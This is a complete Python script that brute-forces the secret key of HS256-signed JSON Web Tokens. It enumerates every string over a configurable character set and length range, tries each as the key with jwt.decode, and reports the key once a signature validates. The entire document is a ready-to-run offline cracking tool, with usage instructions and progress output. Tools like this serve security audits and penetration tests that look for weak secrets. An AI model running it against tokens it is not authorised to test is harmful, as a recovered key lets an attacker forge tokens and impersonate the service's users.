#!/usr/bin/env python3
#Usage is as follows: ./jwtbrute.py MyJWTToken [keyspace] [min key length] [max key length] [-s for silent]
import jwt
import sys
from itertools import chain, product
found = False
attempts = 0
#Command line arguments: 0 = program, 1 = Token, 2 = Alphabet, 3 = minLength, 4 = MaxLength
pArgs = sys.argv
if len(pArgs) < 2:
    sys.exit("Incorrect syntax; try: ./jwtbrute.py MyJWTToken [keyspace] [min key length] [max key length] [-s for silent]")
myToken = pArgs[1] #your JWT token.
if len(pArgs) >= 3:
    myAlpha = pArgs[2] #keyspace - default is full upper and lower case, plus numbers, plus special characters
else:
    myAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_-+"
if len(pArgs) >= 4:
    minLength = int(pArgs[3]) #min length of guess, default is 1
else:
    minLength = 1
if len(pArgs) >= 5:
    maxLength = int(pArgs[4]) #max length of guess, default is 4
else:
    maxLength = 4

if len(pArgs) >= 6 and pArgs[5] == "-s":
    silent = True
else:
    silent = False
if int(maxLength) < int(minLength):
    sys.exit("Error: Max key length cannot be less than min key length.")

def brute(charset, keylength, keymin):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(keymin, keylength + 1)))

for keyl in brute(myAlpha, maxLength, minLength):
    attempts += 1
    try:
        jwt.decode(myToken, keyl, algorithms=["HS256"])
        sys.stdout.write("Key Found! %s\n" % (keyl))
        sys.stdout.flush()
        found = True
    except jwt.exceptions.InvalidSignatureError:
        pass

    #-s for silent mode will hide these messages
    if silent == False:
        if attempts % 1000 == 0:
            sys.stdout.write("Currently on attempt %s\n" % (attempts))
            sys.stdout.write("Current Guess: %s\n" % (keyl))

    if found == True:
        sys.exit("Key found in %s attempts." % (attempts))

if found == False:
    sys.exit("Key not found after %s attempts." % (attempts))
